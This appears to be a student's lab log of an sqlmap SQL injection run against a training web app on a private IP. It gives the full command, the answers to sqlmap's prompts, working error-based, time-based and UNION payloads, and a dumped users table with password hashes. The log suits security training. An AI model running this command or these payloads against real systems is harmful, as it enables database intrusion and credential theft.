=================================================================================
0. Palaistā komanda
sqlmap -u "http://192.168.17.134/sqlinjection/example4/?req=username%3d%27hacker%27" -p req --dump --risk=1 --level=1

1. Jautājumi, kurus uzdeva SQLMap
1.1. it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
1.2. for the remaining tests, do you want to include all tests for MySQL extending provided level (1) and risk (1) values? [Y/n] n
1.3. GET parameter 'req' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
1.4. do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
1.5.do you want to crack them via a dictionary-based attack? [Y/n/q] n
1.6. what dictionary do you want to use? 1 (default dictionary)
1.7. do you want to use common password suffixes? (slow!) [y/N] n
=================================================================================
sqlmap identified the following injection point(s) with a total of 41 HTTP(s) requests:
---
Parameter: req (GET)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: req=username='hacker' AND EXTRACTVALUE(8890,CONCAT(0x5c,0x716b786271,(SELECT (ELT(8890=8890,1))),0x7162766271))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: req=username='hacker' AND (SELECT 8472 FROM (SELECT(SLEEP(5)))QzUU)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: req=username='hacker' UNION ALL SELECT CONCAT(0x716b786271,0x78424d75536d685043744f51704f4678546f516f4768565464496e436c676a4a415469475047484e,0x7162766271),NULL,NULL-- -
---
web server operating system: Linux Debian 6 (squeeze)
web application technology: Apache 2.2.16
back-end DBMS: MySQL >= 5.1
Database: sqlinjection_example4
Table: users
[5 entries]
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | 1ed2b44c2f006040e34205455226e695 | user1    |
| 2  | 1ed2b44c2f006040e34205455226e695 | user2    |
| 3  | 1ed2b44c2f006040e34205455226e695 | user3    |
| 4  | 1ed2b44c2f006040e34205455226e695 | user4    |
| 5  | 1ed2b44c2f006040e34205455226e695 | hacker   |
+----+----------------------------------+----------+

